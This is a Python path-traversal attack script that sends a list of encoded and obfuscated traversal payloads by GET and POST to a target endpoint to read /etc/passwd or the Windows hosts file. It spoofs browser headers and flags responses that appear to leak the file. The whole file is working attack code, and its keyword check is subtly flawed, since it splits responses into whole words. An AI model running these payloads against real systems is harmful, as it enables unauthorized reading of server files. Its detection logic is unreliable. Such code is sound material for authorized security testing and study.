import requests
from urllib.parse import quote

payloads = [
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../////etc////passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "....//....//etc/passwd",
    "..%c0%afetc%c0%afpasswd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
    "C:/Windows/System32/drivers/etc/hosts"
]

default_keywords = ["root:", "/bin/bash", "[boot loader]", "localhost"]

def is_sensitive(response_text, keywords):
    words = response_text.split()
    return any(i in keywords for i in words)

def check_path_traversal(domain, vuln_endpoint):
    keywords = default_keywords
    base_url = domain.rstrip('/') + vuln_endpoint
    results = []

    try:
        base = requests.get(base_url + "random_file", timeout=5).text
    except:
        base = ""

    for payload in payloads:
        full_url = f"{base_url}{payload}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Referer": domain
        }

        success_result = None

        # Try GET method
        try:
            response = requests.get(full_url, headers=headers, timeout=7)
            snippet = response.text[:300]
            status = response.status_code
            length_diff = abs(len(response.text) - len(base))

            if status == 200 and (is_sensitive(response.text, keywords) or length_diff > 100):
                success_result = {
                    "payload": payload,
                    "url": full_url,
                    "method": "GET",
                    "vulnerable": True,
                    "snippet": snippet
                }
            else:
                results.append({
                    "payload": payload,
                    "url": full_url,
                    "method": "GET",
                    "vulnerable": False,
                    "status_code": status
                })
        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "url": full_url,
                "method": "GET",
                "error": str(e),
                "vulnerable": False
            })

        # Try POST method only if GET didn’t already succeed
        if not success_result:
            try:
                response = requests.post(base_url, data={"file": payload}, headers=headers, timeout=7)
                snippet = response.text[:300]
                status = response.status_code
                length_diff = abs(len(response.text) - len(base))

                if status == 200 and (is_sensitive(response.text, keywords) or length_diff > 100):
                    success_result = {
                        "payload": payload,
                        "url": base_url,
                        "method": "POST",
                        "vulnerable": True,
                        "snippet": snippet
                    }
                else:
                    results.append({
                        "payload": payload,
                        "url": base_url,
                        "method": "POST",
                        "vulnerable": False,
                        "status_code": status
                    })
            except requests.exceptions.RequestException as e:
                results.append({
                    "payload": payload,
                    "url": base_url,
                    "method": "POST",
                    "error": str(e),
                    "vulnerable": False
                })

        if success_result:
            results.append(success_result)

    return results
